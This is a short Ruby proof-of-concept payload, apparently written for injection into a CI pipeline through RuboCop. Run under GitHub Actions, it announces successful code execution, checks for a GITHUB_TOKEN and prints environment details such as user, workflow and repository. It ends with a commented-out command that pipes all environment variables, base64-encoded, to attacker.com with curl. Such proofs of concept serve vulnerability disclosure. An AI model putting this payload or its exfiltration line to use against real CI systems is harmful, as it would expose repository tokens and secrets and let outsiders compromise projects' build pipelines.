# Proof of concept - RuboCop code injection
puts "\n" + "="*60
puts "[!] CODE INJECTION SUCCESSFUL"
puts "[!] Executing arbitrary Ruby code in CI environment"
puts "="*60 + "\n"

# Exfiltrate environment variables (proof of concept)
if ENV['GITHUB_TOKEN']
  puts "[*] GITHUB_TOKEN is present (redacted for safety)"
end

puts "[*] Current directory: #{Dir.pwd}"
puts "[*] User: #{ENV['USER']}"
puts "[*] Workflow: #{ENV['GITHUB_WORKFLOW']}"
puts "[*] Repository: #{ENV['GITHUB_REPOSITORY']}"

# Could execute system commands here
# system("curl https://attacker.com?data=$(env | base64)")
